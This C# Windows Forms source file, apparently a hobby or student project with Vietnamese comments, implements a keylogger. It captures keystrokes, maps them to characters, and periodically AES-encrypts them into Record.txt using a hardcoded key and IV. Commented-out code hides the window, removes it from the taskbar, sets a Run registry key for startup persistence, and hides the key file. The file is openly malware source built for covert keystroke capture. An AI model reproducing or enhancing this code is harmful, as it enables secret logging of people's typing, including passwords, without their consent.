﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        string strkey = "A171AA811A6D353C8BC40F82B689F889";
        string striv = "C87799A3280FE1BC574DED5BC85D003F";

        string file = "Record.txt";
        string pass = "Password.txt";
        string decode = "Decode.txt";
        int s = 0;
        string k = "";
        byte[] key = new byte[16];
        byte[] iv = new byte[16];
        bool CaplockIsTrue = false;
        //Encrypt
        static byte[] Encrypt(string simpletext, byte[] key, byte[] iv)
        {
            byte[] cipheredtext;
            using (Aes aes = Aes.Create())
            {
                ICryptoTransform encryptor = aes.CreateEncryptor(key, iv);
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
                        {
                            streamWriter.Write(simpletext);
                        }

                        cipheredtext = memoryStream.ToArray();
                    }
                }
            }
            return cipheredtext;
        }

        //Decrypt
        static string Decrypt(byte[] cipheredtext, byte[] key, byte[] iv)
        {
            string simpletext = String.Empty;
            using (Aes aes = Aes.Create())
            {
                ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
                using (MemoryStream memoryStream = new MemoryStream(cipheredtext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream))
                        {
                            simpletext = streamReader.ReadToEnd();
                        }
                    }
                }
            }
            return simpletext;
        }

        //
        public Form1()
        {
            InitializeComponent();
            this.KeyPreview = true;
            for (int i = 0; i < 32; i += 2)
            {
                key[i / 2] = Convert.ToByte(strkey.Substring(i, 2), 16);
            }
            for (int i = 0; i < 32; i += 2)
            {
                iv[i / 2] = Convert.ToByte(striv.Substring(i, 2), 16);
            }
            //                                 !!!CANH BAO!!!
            //  KHONG NEN CHAY CODE KHONG HIEN THI FORM VA CODE KHONG HIEN THI TREN TASKBAR CUNG LUC
            //  NEU LO CHAY 2 CODE TREN CUNG LUC, VO TASK-MANAGER -> XOA TIEN TRINH DANG CHAY TRONG VISUAL STUDIO, SAU DO VO COMMENT 2 DONG CODE VA BUILD LAI CHUONG TRINH
            //  NEU DA LO CHAY CA 3 DONG SAU CUNG LUC, VO TASK MANAGER ->STARTUP APPS (BEN TRAI)->DISABLE KEYLOGGER.EXE, SAU DO THUC HIEN NHU DOI VOI 2 CODE TREN CUNG CHUONG TRINH
            //  NHO COMMENT LAI CODE TU KHOI CHAY KHI BAT MAY TINH

            //  Code nay de khong hien form tren man hinh
            //this.Opacity = 0;

            //  Code nay de khong hien form tren taskbar
            //this.ShowInTaskbar = false;

            //  Code de khoi chay chuong trinh sau khi khoi dong may
            /*string keyName = "MyProgram";
            string programPath = Assembly.GetExecutingAssembly().Location;
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue(keyName, programPath);*/

            //if_else trong public Form1();
            /*
            if (!File.Exists(pass))
            {

                using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
                {
                    rng.GetBytes(key);
                    rng.GetBytes(iv);
                }
                string key_string = BitConverter.ToString(key).Replace("-", "");
                string iv_string = BitConverter.ToString(iv).Replace("-", "");
                using (StreamWriter sw = File.CreateText(pass))
                {
                    sw.WriteLine(key_string);
                    sw.WriteLine(iv_string);
                }
                //Code de an file pass.txt
                //File.SetAttributes(pass, FileAttributes.Hidden);
            }
            else
            {
                string[] detached = new string[40];
                string line;
                int j = 0;
                using (StreamReader sr = new StreamReader(pass))
                {
                    while ((line = sr.ReadLine()) != null)
                    {
                        if (line == "")
                            continue;
                        detached[j] = line;
                        j++;
                    }
                }
                key = new byte[detached[0].Length / 2];
                for (int i = 0; i < detached[0].Length; i += 2)
                {
                    key[i / 2] = Convert.ToByte(detached[0].Substring(i, 2), 16);
                }

                iv = new byte[detached[1].Length / 2];
                for (int i = 0; i < detached[1].Length; i += 2)
                {
                    iv[i / 2] = Convert.ToByte(detached[1].Substring(i, 2), 16);
                }

            }
            */
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            s = s + 1;
            label5.Text = (5 - s).ToString();
            if (s == 5)//60)
            {
                s = 0;
                if (!File.Exists(file))
                {
                    using (StreamWriter sw = File.CreateText(file))
                    {

                    }
                }
                if (k != "")
                {
                    byte[] encrypted_k = Encrypt(k, key, iv);
                    string encrypted_k_String = Convert.ToBase64String(encrypted_k);
                    using (StreamWriter sw = File.AppendText(file))
                    {
                        sw.WriteLine(encrypted_k_String);
                    }
                    k = "";
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Interval = 1000;
            timer1.Start();
        }
        private void Form1_KeyUp(object sender, KeyEventArgs e)
        {
            string wrote = "";
            if (e.KeyCode == Keys.ShiftKey)
                wrote = "ShiftKeyUp";
            if (wrote != "")
            {
                k = k + wrote + " ";
            }
            label4.Text = k;

            label6.Text = e.KeyCode.ToString();
            label7.Text = e.KeyValue.ToString();
            label8.Text = e.KeyData.ToString();
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            //
            string wrote = "";
            CaplockIsTrue = Control.IsKeyLocked(Keys.CapsLock);
            if (e.KeyCode == Keys.Space)
                wrote = " ";
            // nhap so

            else if (char.IsDigit((char)e.KeyCode) && e.Modifiers != Keys.Shift)
            {
                wrote = ((char)e.KeyCode).ToString();
            }
            // nhap to hop phim voi Shift
            else if (e.Modifiers == Keys.Shift && !char.IsLetter((char)e.KeyCode))
            {
                switch (e.KeyCode)
                {
                    case Keys.D1: wrote = "!"; break;
                    case Keys.D2: wrote = "@"; break;
                    case Keys.D3: wrote = "#"; break;
                    case Keys.D4: wrote = "$"; break;
                    case Keys.D5: wrote = "%"; break;
                    case Keys.D6: wrote = "^"; break;
                    case Keys.D7: wrote = "&"; break;
                    case Keys.D8: wrote = "*"; break;
                    case Keys.D9: wrote = "("; break;
                    case Keys.D0: wrote = ")"; break;
                    case Keys.OemMinus: wrote = "_"; break;
                    case Keys.Oemplus: wrote = "+"; break;
                    case Keys.OemQuestion: wrote = "?"; break;
                    case Keys.OemPeriod: wrote = ">"; break;
                    case Keys.Oemcomma: wrote = "<"; break;
                }
            }
            else if (e.Modifiers != Keys.Shift && !char.IsLetter((char)e.KeyCode))
            {
                switch (e.KeyCode)
                {
                    case Keys.OemMinus: wrote = "-"; break;
                    case Keys.Oemplus: wrote = "="; break;
                    case Keys.Oemtilde: wrote = "`"; break;
                    case Keys.OemQuestion: wrote = "/"; break;
                    case Keys.OemPeriod: wrote = "."; break;
                    case Keys.Oemcomma: wrote = ","; break;
                }
            }
            //Nhap chu in hoa qua Capslock
            else if (CaplockIsTrue && char.IsLetter((char)e.KeyCode))
            {
                if (e.Modifiers != Keys.Shift)
                {
                    switch (e.KeyCode)
                    {
                        case Keys.Oem1: wrote = ":"; break;
                        case Keys.Oem7: wrote = "\""; break;
                        case Keys.OemOpenBrackets: wrote = "{"; break;
                        case Keys.Oem6: wrote = "}"; break;
                        case Keys.Oem5: wrote = "|"; break;
                        case Keys.Oemtilde: wrote = "~"; break;
                        default: wrote = e.KeyCode.ToString(); break;
                    }
                }
                else
                {
                    switch (e.KeyCode)
                    {
                        case Keys.Oem1: wrote = ";"; break;
                        case Keys.Oem7: wrote = "'"; break;
                        case Keys.OemOpenBrackets: wrote = "["; break;
                        case Keys.Oem6: wrote = "]"; break;
                        case Keys.Oem5: wrote = @"\"; break;
                        case Keys.Oemtilde: wrote = "`"; break;
                        default: wrote = e.KeyCode.ToString().ToLower(); break;
                    }
                }
            }
            // Nhap chu in hoa + cac Oem dang ki tu
            else if (char.IsLetter((char)e.KeyCode) && e.Modifiers == Keys.Shift)
            {
                switch (e.KeyCode)
                {
                    case Keys.Oem1: wrote = ";"; break;
                    case Keys.Oem7: wrote = "'"; break;
                    case Keys.OemOpenBrackets: wrote = "["; break;
                    case Keys.Oem6: wrote = "]"; break;
                    case Keys.Oem5: wrote = @"\"; break;
                    case Keys.Oemtilde: wrote = "`"; break;
                    default: wrote = e.KeyCode.ToString(); break;
                }
            }
            // nhap chu thuong
            else if ((char.IsLetter((char)e.KeyCode) && e.Modifiers != Keys.Shift && !CaplockIsTrue))
            {
                switch (e.KeyCode)
                {
                    case Keys.Oem1: wrote = ";"; break;
                    case Keys.Oem7: wrote = "'"; break;
                    case Keys.OemOpenBrackets: wrote = "["; break;
                    case Keys.Oem6: wrote = "]"; break;
                    case Keys.Oem5: wrote = @"\"; break;
                    case Keys.Oemtilde: wrote = "`"; break;
                    default: wrote = e.KeyCode.ToString().ToLower(); break;
                }
            }

            if (wrote == "")//&& e.Modifiers!=Keys.Shift)
            {
                wrote = e.KeyCode.ToString();
            }


            //
            if (wrote != "")
            {
                k = k + wrote + " ";
            }
            label4.Text = k;

            label6.Text = e.KeyCode.ToString();
            label7.Text = e.KeyValue.ToString();
            label8.Text = e.KeyData.ToString();
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            //
            {
                byte[] encrypted_k = Encrypt(k, key, iv);
                string encrypted_k_String = Convert.ToBase64String(encrypted_k);
                using (StreamWriter sw = File.AppendText(file))
                {
                    sw.WriteLine(encrypted_k_String);
                }
                k = "";
            }
            File.Delete("./Password.txt");
            //
            /*if (!File.Exists(decode))
            {
                using (StreamWriter sw = File.CreateText(decode))
                {

                }
            }
            string line;
            using (StreamReader sr = new StreamReader(file))
            {
                using (StreamWriter sw = new StreamWriter(decode))
                {
                    while ((line = sr.ReadLine()) != null)
                    {
                        byte[] encrypted_k = Convert.FromBase64String(line);
                        string decrypted_k = Decrypt(encrypted_k, key, iv);
                        sw.WriteLine(decrypted_k);
                    }
                }
            }*/
        }

        
    }
}
